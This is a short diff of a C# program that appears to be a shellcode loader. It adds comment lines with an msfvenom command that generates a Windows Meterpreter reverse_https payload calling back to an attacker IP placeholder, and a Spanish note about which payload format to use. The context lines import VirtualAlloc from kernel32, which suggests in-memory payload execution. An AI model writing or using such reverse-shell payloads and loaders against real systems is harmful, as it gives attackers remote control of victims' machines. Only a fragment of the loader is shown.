@@ -8,6 +8,10 @@ using System.Security.Cryptography.X509Certificates;
 public class Program
 {
 
+	
+//msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<Attack_IP> LPORT=8080 -f exe > rev.exe
+//En la prueba he generado payload en formato exe, quizás con formato c# es más apropiado
+
     //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
     [DllImport("kernel32")]
     private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
